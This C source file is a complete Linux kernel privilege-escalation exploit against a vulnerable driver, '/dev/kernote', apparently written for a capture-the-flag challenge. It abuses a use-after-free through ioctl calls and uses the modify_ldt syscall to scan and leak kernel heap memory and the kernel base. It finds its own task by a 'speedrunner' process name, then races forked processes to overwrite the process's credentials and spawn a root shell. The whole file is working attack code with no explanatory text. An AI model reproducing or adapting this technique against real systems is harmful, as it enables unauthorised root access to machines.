#define _GNU_SOURCE
#include <inttypes.h>
#include <sys/types.h>
#include <stdio.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>

#define LOAD 0x6666
#define ALLOC 0x6667
#define FREE 0x6668
#define WRITE 0x6669
#define READ  0x666A

struct user_desc {
	unsigned int  entry_number;
	unsigned int  base_addr;
	unsigned int  limit;
	unsigned int  seg_32bit:1;
	unsigned int  contents:2;
	unsigned int  read_exec_only:1;
	unsigned int  limit_in_pages:1;
	unsigned int  seg_not_present:1;
	unsigned int  useable:1;
	unsigned int  lm:1;
};

int fd = 0, seq_fd = 0;
static int page_size = 0x1000;
unsigned long global_sharer = 0;
unsigned long kernel_base = 0;
char *c_ptr;
long condition = 0;
unsigned long pivot_point = 0;

void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
        exit(1337);
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

void alloc(long idx)
{
	int ret = ioctl(fd, ALLOC, idx);
	if (ret)	exit(printf("Index: 0x%lx allocation failed.", idx));
}

void delete(long idx)
{
	int ret = ioctl(fd, FREE, idx);
	if (ret)	exit(printf("Index: 0x%lx free failed.", idx));
}

void load(long idx)
{
	int ret = ioctl(fd, LOAD, idx);
	// if (ret)	exit(printf("Index: 0x%lx load failed.", idx));
}

void write_note(unsigned long data)
{
	int ret = ioctl(fd, WRITE, data);
	if (ret)	exit(printf("Write: 0x%lx write failed.", data));
}

void read_note()
{
	int ret = ioctl(fd, READ, 0);
	if (ret)	exit(printf("Read failed."));
}

int main()
{
	system("cat /symbols | grep kernote");

	system("cat /symbols | grep \" _text\"");
	
	fd = open("/dev/kernote", O_RDWR);
	if (fd<=0)	exit(puts("ERROR in open(fd)"));

	system("ls -lh exploit && date");

	alloc(0);
	load(0);
	delete(0);

	struct user_desc u_desc;
	u_desc.entry_number = 0x2000-1;
	u_desc.base_addr = 0x0;
	u_desc.limit = 0;
	u_desc.seg_32bit = 0;
	u_desc.contents = 0;
	u_desc.read_exec_only = 0;
	u_desc.limit_in_pages = 0;
	u_desc.seg_not_present = 0;
	u_desc.useable = 0;
	u_desc.lm = 0;

	long ret = syscall(__NR_modify_ldt, 1, &u_desc, sizeof(u_desc));
	// printf("syscall(__NR_modify_ldt, WRITE) returns: 0x%lx\n", ret);

	char *buf = (char *)mmap(NULL, 8*0x2000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
	
	// unsigned long base = 0xffffffff80000000;
	unsigned long base = 0xffff888000000000;
	int i = 0;
	while(base < (unsigned long)0xfffffffff0000000)
	{
		write_note(base);
		ret = syscall(__NR_modify_ldt, 0, buf, 0x1);
		if (ret == 1)
			break;
		base += 0x40000000;
	}

	unsigned long heap_base = base;
	printf("found heap_base?: 0x%lx\n", heap_base);

	int fd1[2];
	int fd2[2];

	prctl(PR_SET_NAME, "speedrunner");
	printf("pid: 0x%lx\n", getpid());

	pid_t parent_pid = getpid();
	unsigned long cred_leak;
	unsigned long ptr = heap_base;
	pid_t pid;
	while(1)
	{
		if (pipe(fd1) == -1) {
		    fprintf(stderr, "Pipe Failed");
		    return 1;
		}
		if (pipe(fd2) == -1) {
		    fprintf(stderr, "Pipe Failed");
		    return 1;
		}

		write_note(ptr);
		pid = fork();
		if (pid < 0) {
			fprintf(stderr, "fork Failed");
			return 1;
		}
		if (pid)
		{
			// Parent
			close(fd1[0]); // Close reading end of first pipe
			close(fd1[1]);

			wait(NULL);
			close(fd2[1]); // Close writing end of second pipe

			read(fd2[0], &global_sharer, 8);

			if (global_sharer != 0)
			{
				cred_leak = global_sharer;
				read(fd2[0], &kernel_base, 8);
				kernel_base -= 0x166b540;
				close(fd2[0]);
				break;
			}
		}
		else
		{
			// Child
			close(fd1[1]); // Close writing end of first pipe
			memset(buf, 0, 0x2000*8);
			ret = syscall(__NR_modify_ldt, 0, buf, 0x2000*8);
			if (ret != 0x2000*8)
			{
				exit(printf("CHILD: Some issue while leaking from kernel. ret: 0x%lx\n", ret));
			}
			c_ptr = buf;
			while(c_ptr < buf + 0x2000*8)
			{
				if (strncmp(c_ptr, "speedrunner", 10) == 0 && (*(pid_t *)(c_ptr - 0x1d0)) == parent_pid)
				{
					global_sharer = *(unsigned long *)(c_ptr - 0x10);
					write(fd2[1], &global_sharer, 8);
					global_sharer = *(unsigned long *)(c_ptr + 0x58);
					write(fd2[1], &global_sharer, 8);
				}
				c_ptr += 8;
			}
			global_sharer = 0;
			write(fd2[1], &global_sharer, 8);
			close(fd1[0]);
			close(fd2[0]);
			close(fd2[1]);

			exit(0);
		}
		ptr = ptr + 0x2000*8;
	}

	printf("cred_leak: 0x%lx\n", cred_leak);
	printf("kernel_base: 0x%lx\n", kernel_base);
	// write_note(cred_leak + 4);

	for (int i=0; i<0x10; i++)	alloc(i);
	read(0, buf, 1);
	// for (int i=0; i<0x10; i++)	delete(i);

	puts("Forking...");
	pid = fork();
	if (pid < 0) {
		fprintf(stderr, "fork Failed");
		return 1;
	}
	if (pid)
	{
		// Parent
		printf("Parent here. Crushing time :D\n");
		sleep(6);
		setreuid(0,0);
		setregid(0,0);
		// get_shell();
		system("/bin/sh");
	}
	else
	{
		// Child
		pid = fork();
		if (pid < 0) {
			fprintf(stderr, "fork Failed");
			return 1;
		}
		if (pid)
		{
			// Child - parent
			cpu_set_t cpu_set;
		    CPU_ZERO(&cpu_set);
		    CPU_SET(0,&cpu_set);
		    sched_setaffinity(0,sizeof(cpu_set),&cpu_set);
			
			u_desc.entry_number = 0x2;
			u_desc.base_addr = 0;
			u_desc.limit = 0;
			u_desc.seg_32bit = 0;
			u_desc.contents = 0;
			u_desc.read_exec_only = 0;
			u_desc.limit_in_pages = 0;
			u_desc.seg_not_present = 0;
			u_desc.useable = 0;
			u_desc.lm = 0;
			sleep(3);
			ret = syscall(__NR_modify_ldt, 1, &u_desc, sizeof(u_desc));
			alloc(0);
			puts("ldt_write done");
			sleep(0x31337);
		}
		else
		{
			// Child child
			cpu_set_t cpu_set;
		    CPU_ZERO(&cpu_set);
		    CPU_SET(0,&cpu_set);
		    sched_setaffinity(0,sizeof(cpu_set),&cpu_set);
			
			sleep(1);
			// for (int i=0; i<0x10; i++)	alloc(i);	
			load(0xf);
			for (int i=0; i<0x10; i++)	delete(i);
		    
		    CPU_ZERO(&cpu_set);
		    CPU_SET(0,&cpu_set);
		    sched_setaffinity(0,sizeof(cpu_set),&cpu_set);
		    puts("bruting overwrite now...");
			while(1)	write_note(cred_leak + 4);			
			exit(puts("Child child over 'n out..."));
		}
	}
	read(0, buf, 1);

	return 0;
}